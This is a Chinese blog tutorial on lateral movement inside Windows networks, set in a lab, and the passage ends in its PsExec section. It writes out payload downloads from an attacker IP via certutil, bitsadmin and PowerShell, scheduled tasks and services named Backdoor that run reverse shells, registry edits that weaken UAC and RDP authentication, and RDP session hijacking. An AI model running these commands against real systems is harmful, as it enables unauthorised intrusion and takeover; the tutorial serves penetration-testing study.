@@ -1,0 +1,441 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>内网渗透体系建设——横向移动 | micgo's blog</title><meta name="keywords" content="内网"><meta name="author" content="micgo"><meta name="copyright" content="micgo"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="横向移动本章所有关于横向移动的攻击技术都以如图所示的网络拓扑进行测试   Kali Linux为测试人员的主机，其对测试人员是可控的，也被称为”可控主机”或”可控服务器”。Initial Victim为测试人员最初攻陷的机器，也被称为”跳板机” “所控主机”或”当前所控主机”。内网中的其他三台机器分别是本次实践的横向移动目标，需要从Initial Victim迁移到这三台目标机器。它们也被称为”远">
+<meta property="og:type" content="article">
+<meta property="og:title" content="内网渗透体系建设——横向移动">
+<meta property="og:url" content="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(5)/index.html">
+<meta property="og:site_name" content="micgo&#39;s blog">
+<meta property="og:description" content="横向移动本章所有关于横向移动的攻击技术都以如图所示的网络拓扑进行测试   Kali Linux为测试人员的主机，其对测试人员是可控的，也被称为”可控主机”或”可控服务器”。Initial Victim为测试人员最初攻陷的机器，也被称为”跳板机” “所控主机”或”当前所控主机”。内网中的其他三台机器分别是本次实践的横向移动目标，需要从Initial Victim迁移到这三台目标机器。它们也被称为”远">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg">
+<meta property="article:published_time" content="2023-04-03T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-04-04T01:52:20.551Z">
+<meta property="article:author" content="micgo">
+<meta property="article:tag" content="内网">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg"><link rel="shortcut icon" href="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg"><link rel="canonical" href="https://micgo.top/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F(5)/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '内网渗透体系建设——横向移动',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-04 09:52:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="micgo's blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20230225215514.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">26</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">19</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/20201009112151822.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">micgo's blog</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">内网渗透体系建设——横向移动</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-04-03T16:00:00.000Z" title="发表于 2023-04-04 00:00:00">2023-04-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-04T01:52:20.551Z" title="更新于 2023-04-04 09:52:20">2023-04-04</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="内网渗透体系建设——横向移动"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h4 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h4><p>本章所有关于横向移动的攻击技术都以如图所示的网络拓扑进行测试</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230402204815303.png" alt="image-20230402204815303" style="zoom:60%;" />
+
+<p>Kali Linux为测试人员的主机，其对测试人员是可控的，也被称为”可控主机”或”可控服务器”。Initial Victim为测试人员最初攻陷的机器，也被称为”跳板机” “所控主机”或”当前所控主机”。内网中的其他三台机器分别是本次实践的横向移动目标，需要从Initial Victim迁移到这三台目标机器。它们也被称为”远程主机”或”内网其他主机”</p>
+<h5 id="横向移动中的文件传输"><a href="#横向移动中的文件传输" class="headerlink" title="横向移动中的文件传输"></a>横向移动中的文件传输</h5><p>测试人员往往需要预先制订文件传输方案，以便在后续操作过程中向攻击目标部署攻击载荷或其他文件</p>
+<h6 id="通过网络共享"><a href="#通过网络共享" class="headerlink" title="通过网络共享"></a>通过网络共享</h6><blockquote>
+<p>Windows系统中的网络共享功能可以实现局域网之间的文件共享。通过提供有效的用户凭据，用户可以很轻松地将文件从一台机器传输到另一台机器。执行”net share”命令，获得Windows系统默认开启的网络共享，其中C$为C盘共享，ADMIN$为系统目录共享，还有一个是<strong>IPC$共享</strong>。IPC (Internet Process Connection) 是共享”命名管道”的资源，为了让进程间通信而开放的命名管道，通过提供可信任的用户名和口令，连接双方可以建立安全的通道并以此通道进行加密数据的交换，从而实现对远程计算机的访问</p>
+</blockquote>
+<p>实战中往往会建立IPC$连接。通过IPC$连接，不仅可以进行所有文件共享操作，还可以实现其他远程管理操作，如列出远程主机进程、在远程主机上创建计划任务或系统服务等，这在进行内网横向移动中起着至关重要的作用</p>
+<p>建立IPC$连接需要具备以下两个条件：①远程主机开启了IPC连接； ②远程主机的139端口和445端口开放</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.19\IPC$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;</span><br><span class="line">net use \\&lt;IP/Hostname&gt;\IPC$ &lt;Password&gt; /user:&lt;Username&gt;</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403093839496.png" alt="image-20230403093839496" style="zoom:80%;" />
+
+<p>列出远程主机的C盘共享目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\10.10.10.19\C$</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403094027424.png" alt="image-20230403094027424" style="zoom: 67%;" />
+
+<p>“copy”命令可以通过共享连接向远程主机上复制文件，也可以将远程主机上的文件复制到本地，但需要注意当前用户对远程目录的权限。实战中可以将攻击载荷上传到远程主机，然后通过其他远程执行的方法来运行，如创建远程计划任务或服务等</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy .\reverse_tcp.exe 10.10.10.19\cs</span><br></pre></td></tr></table></figure>
+
+<p>建立其他共享连接的命令与PC$连接的命令相同，需要指定远程主机的IP或主机名、盘符、用户名和密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use \\10.10.10.19\C$ &quot;Admin@123&quot; /user:&quot;Administrator&quot;      #连接远程主机的C$共享</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="搭建SMB服务器"><a href="#搭建SMB服务器" class="headerlink" title="搭建SMB服务器"></a>搭建SMB服务器</h6><p>实战中可以在测试人员自已的服务器或当前所控内网主机上搭建SMB服务器，将需要横向传输的文件如攻击载荷等放入SMB服务器的共享目录，并指定UNC路径，让横向移动的目标主机远程加载SMB共享的文件。注意需使用SMB匿名共享，并且搭建的SMB服务器能够被横向移动的目标所访问到<br>在Linux系统上，可以通过Impacket项目提供的smbserver.py来搭建SMB服务器。搭建一个名为evilsmb，共享目录指向&#x2F;root&#x2F;share的SMB匿名共享</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir /root/share</span><br><span class="line">python smbserver.py evilsmb /root/share -smb2support</span><br></pre></td></tr></table></figure>
+
+<p>对于Windows系统，如果已经获取管理员权限，可以手动配置SMB匿名共享，也可以通过Invoke-BuildAnonymousSMBServer在本地快速启动一个匿名共享</p>
+<h6 id="通过windows自带工具"><a href="#通过windows自带工具" class="headerlink" title="通过windows自带工具"></a>通过windows自带工具</h6><ul>
+<li><p>Certutil</p>
+<p>Certutil是Windows自带的命令行工具，用于管理Windows证书并作为证书服务的一部分安装。Certutil提供从网络中下载文件的功能，可以在远程主机上执行Certutil命令，控制其下载预先部署在可控服务器上的恶意文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -urlcache -<span class="built_in">split</span> -f http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>BITSAdmin<br>Bitsadmin是一个Windows命令行工具，可以用于创建、下载或上载作业，监视其进度。Windows7及以后版本的系统自带Bitsadmin工具</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bitsadmin /transfer test http://IP:Port/shell.exe C:\reverse_tcp.exe</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>PowerShell</p>
+</li>
+</ul>
+<p>参考PowerShell远程加载执行的思路，可以通过创建WebClient对象来实现文件下载</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(New-Object System.Net.Webclient).DownloadFile(&#x27;http://IP:Port/shell.exe&#x27;,&#x27;C:\reverse_tcp.exe&#x27;)</span><br><span class="line">powershell.exe -exec bypass -Command &quot;(New-Object New Net.WebClient).DownloadFile(&#x27;http://192.168.92.130:81/flag.txt&#x27;,&#x27;C:\temp\flag.txt&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="创建计划任务"><a href="#创建计划任务" class="headerlink" title="创建计划任务"></a>创建计划任务</h5><h6 id="常规利用流程"><a href="#常规利用流程" class="headerlink" title="常规利用流程"></a>常规利用流程</h6><p>测试人员可以通过已有的IPC连接，在远程主机上创建计划任务，让目标主机在规定的时间点或周期内执行特定操作。在拥有对方管理员凭据的条件下，可以通过计划任务实现横向移动，具体操作流程如下：<br>①利用已建立的共享连接向远程主机上传攻击载荷<br>②利用已建立的IPC连接或指定用户凭据的方式在远程主机上创建计划任务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S &lt;TargetIP&gt; /TN Backdoor /SC minute /MO 1 /TR &lt;PayloadPath&gt; /RU System /F</span><br><span class="line"># /S  指定要连接到的系统</span><br><span class="line"># /TN 指定要创建的计划任务名称</span><br><span class="line"># /SC 指定计划任务执行频率</span><br><span class="line"># /MO 指定计划任务执行周期</span><br><span class="line"># /TR 指定计划任务运行的程序路径</span><br><span class="line"># /RU 指定计划任务运行的用户权限</span><br><span class="line"># /F  如果指定的任务已存在,则强制创建</span><br></pre></td></tr></table></figure>
+
+<p>如果没有建立IPC连接，就需要手动指定远程主机的用户凭据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S &lt;TargetIP&gt; /TN Backdoor /SC minute /MO 1 /TR &lt;PayloadPath&gt;</span><br><span class="line">/RU System /F /U Administrator /P Admin@123</span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403111612559.png" alt="image-20230403111612559" style="zoom:69%;" />
+
+<p>立即启动该计划任务即可获取远程主机的权限，也可以等待计划任务自行启动</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">schtasks /RUN /S &lt;TargetIP&gt; /I /TN Backdoor     #立即启动计划任务</span><br><span class="line">schtasks /Delete /S &lt;TargetIP&gt; /TN Backdoor /F  #删除计划任务</span><br></pre></td></tr></table></figure>
+
+<p>也可以通过创建计划任务在远程主机上执行系统命令，并将执行结果写入文件，然后通过type命令进行远程读取</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S &lt;TargetIP&gt; /TN Backdoor /SC minute /MO 1 /TR <span class="string">&quot;C:\Windows\System32\cmd.exe</span></span><br><span class="line"><span class="string">/c &#x27;whoami &gt; C:\result.txt&#x27;&quot;</span> /RU System /f</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> \\&lt;TargetIP&gt;\C$\result.txt    <span class="comment">#读取执行结果</span></span><br></pre></td></tr></table></figure>
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403112106471.png" alt="image-20230403112106471" style="zoom:80%;" />
+
+
+
+<h6 id="UNC路径加载执行"><a href="#UNC路径加载执行" class="headerlink" title="UNC路径加载执行"></a>UNC路径加载执行</h6><p>Windows系统中使用UNC路径来访问网络共享资源，格式如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\\servername\sharename\directory\filename</span><br><span class="line"># servername是服务器主机名  sharename是网络共享的名称  directory和filename分别为该共享下的目录和文件</span><br></pre></td></tr></table></figure>
+
+<p>在远程主机上攻击载荷时，可以直接使用UNC路径代替常规的本地路径，让远程主机直接在测试人员搭建的SMB共享中加载攻击载荷并执行。这样可以省去手动上传攻击载荷的步骤。以计划任务为例进行演示，其他类似创建服务、PsExec、WMI、DCOM等远程执行方法都适用<br>①在一台可控的服务器上搭建SMB匿名共享服务，并将生成的攻击载荷放入共享目录</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403112845704.png" alt="image-20230403112845704" style="zoom:67%;" />
+
+<p>②执行以下命令，在远程主机(10.10.10.19)创建计划任务，使用UNC路径加载位于192.168.2.143共享中的攻击载荷并执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /Create /S 10.10.10.19 /TN Backdoor /SC minute /MO 1 /TR \\192.168.2.143\evilsmb\reverse_tcp.exe /RU System /F /U Administrator /P Admin@123</span><br></pre></td></tr></table></figure>
+
+<p>启动后，远程主机成功上线</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403113132199.png" alt="image-20230403113132199" style="zoom: 80%;" />
+
+
+
+
+
+<h5 id="利用系统服务"><a href="#利用系统服务" class="headerlink" title="利用系统服务"></a>利用系统服务</h5><h6 id="创建远程服务"><a href="#创建远程服务" class="headerlink" title="创建远程服务"></a>创建远程服务</h6><p>除了创建计划任务，测试人员还可以通过在远程主机上创建系统服务的方式，在远程主机上运行指定的程序或命令。该方式需要拥有两端主机的管理员权限和IPC$连接，具体操作如下<br>①利用已建立的共享连接向远程主机(10.10.10.19)上传攻击载荷<br>②利用已建立的IPC连接在远程主机上创建系统服务</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sc \\10.10.10.19 create Backdoor binpath=&quot;cmd.exe /k C:\reverse_tcp.exe&quot;</span><br><span class="line"># binpath,指定服务启动时运行的二进制文件，注意&quot;=&quot;后需要有一个空格</span><br></pre></td></tr></table></figure>
+
+<p>在远程主机，上创建一个名为Backdoor的系统服务，服务启动时将执行上传的攻击载荷</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403204509325.png" alt="image-20230403204509325" style="zoom:67%;" />
+
+<p>③执行以下命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\10.10.10.19 start Backdoor</span><br></pre></td></tr></table></figure>
+
+<p>立即启动该服务，此时虽然提示错误，但是已经成功获取了远程主机的权限</p>
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403204601176.png" alt="image-20230403204601176" style="zoom:77%;" />
+
+<img src="https://my-blog-1309286065.cos.ap-guangzhou.myqcloud.com/img/image-20230403204642444.png" alt="image-20230403204642444" style="zoom:60%;" />
+
+<p>攻击成功后，将创建的服务删除</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc \\10.10.10.19 delete Backdoor</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="SCShell"><a href="#SCShell" class="headerlink" title="SCShell"></a>SCShell</h6><p>SCShel1是一款利用系统服务的无文件横向移动工具。与传统的创建远程服务的方法不同，SCShell利用提供的用户凭据，通过ChangeServiceConfigA API修改远程主机上的服务配置，将服务的二进制路径名修改为指定的程序或攻击载荷，然后重启服务。执行结束后，服务二进制路径将恢复为原始路径<br>SCShell需要提供远程主机的管理员权限用户的凭据，并且需要已知远程主机上的系统服务名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SCShell.exe 10.10.10.19 XblAuthManager &quot;C:\Windows\System32\cmd.exe /c calc&quot; hack-my.com Administrator Admin@123</span><br><span class="line">#SCShell.exe &lt;Target&gt; &lt;Service Name&gt; &lt;Payload&gt; &lt;Domain&gt; &lt;Username&gt; &lt;Password&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="UAC-Remote-Restrictions-远程限制"><a href="#UAC-Remote-Restrictions-远程限制" class="headerlink" title="UAC Remote Restrictions(远程限制)"></a>UAC Remote Restrictions(远程限制)</h6><p>简单说就是微软在<code>Windows Vista</code>之后为了更好管理和保护本地管理员组成员的用户, 引入了远程限制, 此机制有助于防止本地恶意软件以管理员权限远程执行(被通过远程的方式调用), 所以只允许<code>RID 500(administrator)</code>这个本地管理员组用户, 其他的用户均会拒绝访问(域管理员用户不受限)</p>
+<blockquote>
+<p><code>Psexec</code>、<code>WMI</code>、<code>WinRM</code>、PTH哈希传递都只能使用RID 500(administrator)本地管理员用户</p>
+</blockquote>
+<p>可以通过执行下面命令后重启系统来关闭远程限制</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 </span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="远程桌面利用"><a href="#远程桌面利用" class="headerlink" title="远程桌面利用"></a>远程桌面利用</h5><p>远程桌面协议(Remote Desktop Protocol, <strong>RDP</strong>)，默认监听TCP 3389端口<br>利用远程桌面进行横向移动是常见的方法。当内网中的其他主机开启了远程桌面服务后，测试人员可以通过已获取的用户凭据，借助内网代理等技术进行远程登录，通过远程桌面服务对目标主机进行实时操作。但是这种方法可能将已登录的用户强制退出，容易被管理员发现</p>
+<h6 id="远程桌面的确定和开启"><a href="#远程桌面的确定和开启" class="headerlink" title="远程桌面的确定和开启"></a>远程桌面的确定和开启</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">reg query <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections  </span><br><span class="line"><span class="comment"># 查询是否已开启远程桌面,显示0x0则已开启,0x1表示未开启</span></span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot;</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f                   <span class="comment"># 开启远程桌面连接</span></span><br><span class="line"> </span><br><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot;</span> /v UserAuthentication /t REG_DWORD /d 0     <span class="comment">#关闭&quot;仅允许运行使用网络级别身份验证的远程桌面的计算机连接&quot;(鉴权)</span></span><br><span class="line"> </span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Remote Desktop&quot;</span> protocol=TCP <span class="built_in">dir</span>=<span class="keyword">in</span> localport=3389 action=allow <span class="comment"># 设置防火墙放行3389端口</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h6 id="RDP-Hijacking"><a href="#RDP-Hijacking" class="headerlink" title="RDP Hijacking"></a>RDP Hijacking</h6><blockquote>
+<p>对于开启远程桌面服务的Windows计算机，当多个用户进行登录时，会产生多个会话。渗透测试人员可以通过已获取的SYSTEM权限劫持其他用户的RDP会话，并在未授权的情况下成功登入目标系统，即使该用户的会话已断开。这种攻击方法被称为”RDP Hijacking” (远程桌面劫持)</p>
+</blockquote>
+<p>远程桌面劫持需要获取系统SYSTEM权限并执行tscon命令。该命令提供了一个切换用户会话的功能。在正常情况下，切换会话时需要提供目标用户的登录密码，但在SYSTEM权限下能够完全绕过验证，不输入密码即可切换到目标用户的会话，从而实现未授权登录</p>
+<blockquote>
+<ol>
+<li>登录一个一般权限用户的RDP</li>
+<li>使用工具提权为SYSTEM</li>
+<li>执行<code>query user</code>查看主机会话记录</li>
+<li><code>SYSTEM</code>权限执行<code>tscon &lt;ID&gt;</code>切换到另一个用户的RDP会话</li>
+</ol>
+</blockquote>
+<h6 id="SharpRDP"><a href="#SharpRDP" class="headerlink" title="SharpRDP"></a>SharpRDP</h6><p><code>SharpRDP</code>工具可以通过RDP协议在远程主机执行系统命令, 且不需要GUI客户端, 使用条件:</p>
+<blockquote>
+<ol>
+<li>远程主机开启远程桌面功能</li>
+<li>防火墙关闭&#x2F;放行3389端口</li>
+</ol>
+</blockquote>
+<p>如果想登录一台内网主机的远程桌面，需要先搭建内网代理然后使用RDP客户端进行连接。但测试人员可以直接将SharpRDP上传到跳板机，然后获取到用户凭据，对内网其他主机执行系统命令。这样就省去了内网代理等中间环节</p>
+<h5 id="PsExec-远程控制"><a href="#PsExec-远程控制" class="headerlink" title="PsExec 远程控制"></a>PsExec 远程控制</h5><blockquote>
+<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/zh-cn/sysinternals/downloads/psex">PsExec</a>是微软官方提供的一款实用的Windows远程控制工具，可以根据凭据在远程系统上执行管理操作，并且可以获得与命令行几乎相同的实时交互性。PsExec最强大的功能之一就是可以在远程系统中启动交互式命令提示窗口，以便实时显示有关远程系统的信息</p>
+</blockquote>
+<blockquote>
+<p>PsExec原理是通过SMB连接到服务端的Admin$共享，并释放名为“psexesvc.exe的二进制文件，然后注册名为“PSEXESVC”服务。当客户端执行命令时，服务端通过PSEXESVC服务启动相应的程序执行命令并回显数据。运行结束后，PSEXESVC服务会被删除</p>
+</blockquote>
+<p>用PsExec进行远程操作需要具备以下条件：①远程主机开启了Admin$共享     ②远程主机未开启防火墙或放行445端口</p>
